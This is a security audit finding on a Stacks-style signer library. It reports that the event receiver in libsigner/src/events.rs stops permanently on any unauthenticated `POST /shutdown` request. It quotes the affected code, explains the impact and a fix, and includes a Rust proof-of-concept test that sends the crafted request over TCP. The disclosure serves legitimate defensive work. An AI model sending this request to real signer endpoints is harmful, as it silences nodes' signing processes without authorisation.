### Title
Unauthenticated `/shutdown` request permanently kills a signer's event-receiver thread - ([File: libsigner/src/events.rs])

### Summary
The `SignerEventReceiver::next_event` handler treats any HTTP `POST /shutdown` as an authoritative termination signal, with no check of the sender's identity, source address, or possession of any secret. Any TCP client that can reach the signer's event-receiver listen port can send one crafted `POST /shutdown` request and permanently stop that thread, causing the signer process to stop consuming events from the node.

### Finding Description
The equality/fault claimed by the question is real: the `/shutdown` branch in `next_event` is reached purely based on the HTTP method and URL, without validating who sent the request.

```rust
} else if request.url() == "/shutdown" {
    event_receiver.stop_signal.store(true, Ordering::SeqCst);
    Err(EventError::Terminated)
}
``` [1](#0-0) 

This is invoked from `next_event()`, which is called from the trait's default `main_loop()`:
```rust
Err(EventError::Terminated) => {
    // we're done
    info!("Caught termination signal");
    break;
}
``` [2](#0-1) 

The legitimate caller of this mechanism is `SignerStopSignaler::send()`, which is only supposed to be invoked internally (e.g. from `RunningSigner::stop()` or the OS signal handler) and simply POSTs to `local_addr`:
```rust
if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
    let body = "Yo. Shut this shit down!".to_string();
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
        ...
    );
``` [3](#0-2) 

However, nothing on the receiving side distinguishes this trusted self-connection from an arbitrary external TCP client sending the identical bytes — there is no shared secret, no source-address allowlist, and no signature check on the `/shutdown` path, unlike `/stackerdb_chunks`, `/proposal_response`, or `/new_burn_block`, which at least deserialize a typed JSON body via `process_event`. The `/shutdown` branch requires no body content and no authentication at all, only the URL string match.

Once `stop_signal` is set to `true`, `is_stopped()` returns `true` forever (there is no reset path), so every subsequent call to `next_event()` immediately returns `Err(EventError::Terminated)` and `main_loop()` breaks and exits:
```rust
fn is_stopped(&self) -> bool {
    self.stop_signal.load(Ordering::SeqCst)
}
``` [4](#0-3) 

This is a one-way, irreversible state transition triggered by a single unauthenticated HTTP request.

### Impact Explanation
Any party capable of opening a TCP connection to the signer's event-receiver bind address (the endpoint the stacks-node's event dispatcher is configured to POST events to) can send a single unauthenticated `POST /shutdown` and permanently stop the event-receiver thread for that signer process. After this, the signer no longer receives `stackerdb_chunks`, `proposal_response`, `new_burn_block`, or `new_block` events from the node — the signer effectively goes deaf to the node's event stream, degrading or halting its ability to participate in block signing until the operator manually restarts the process. This is an unauthenticated denial-of-service triggered by a single crafted request, matching the "remote crash/unauthenticated DoS from few messages" category, scoped to the signer's event-receiver component (not the node's core P2P/RPC stack, and not signer decision logic).

### Likelihood Explanation
The only precondition is network reachability to the signer's event-receiver listen address/port — no secret, peer key, StackerDB slot, or admin role is needed, and the request format is trivial to construct (a single HTTP POST with a fixed URL). If that port is bound to a non-loopback interface (which is a deployment/configuration choice, not a code-enforced restriction — the code performs no address-based allow-listing), the attack is trivially repeatable and costs the attacker a single TCP connection and one HTTP request.

### Recommendation
Require some form of proof that the caller is the trusted local process/operator before honoring `/shutdown`：e.g., bind the event-receiver strictly to loopback and reject non-loopback peers at accept time, and/or require a per-process random shared secret (set at startup and passed to `SignerStopSignaler`) that must be presented (e.g. in a header) and checked with constant-time comparison before setting `stop_signal`.

### Proof of Concept
```rust
// libsigner/src/events.rs (add to #[cfg(test)] mod tests)
#[test]
fn unauthenticated_shutdown_terminates_receiver() {
    use std::net::TcpStream;
    use std::io::Write;
    use crate::events::{EventReceiver, SignerEventReceiver};
    use crate::v0::messages::SignerMessage; // T: SignerEventTrait

    let mut receiver: SignerEventReceiver<SignerMessage> = SignerEventReceiver::new(false);
    let addr = receiver.bind("127.0.0.1:0".parse().unwrap()).unwrap();

    // Attacker: any TCP client, no secret, no prior relationship with the node/signer.
    let mut stream = TcpStream::connect(addr).unwrap();
    let body = "attacker-controlled";
    let req = format!(
        "POST /shutdown HTTP/1.1\r\nHost: {addr}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
        body.len(), body
    );
    stream.write_all(req.as_bytes()).unwrap();

    // Assert: the single unauthenticated request already flips stop_signal
    // and next_event() now permanently returns Err(EventError::Terminated).
    let err = receiver.next_event().unwrap_err();
    assert!(matches!(err, crate::EventError::Terminated));
    assert!(receiver.is_stopped());
}
```
This demonstrates that a bare, unauthenticated TCP client can trigger the same termination path as the trusted internal `SignerStopSignaler`, confirming the missing sender check at `libsigner/src/events.rs:443-445`.

### Citations

**File:** libsigner/src/events.rs (L296-300)
```rust
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
```

**File:** libsigner/src/events.rs (L382-393)
```rust
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
```

**File:** libsigner/src/events.rs (L443-445)
```rust
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```

**File:** libsigner/src/events.rs (L462-464)
```rust
    fn is_stopped(&self) -> bool {
        self.stop_signal.load(Ordering::SeqCst)
    }
```
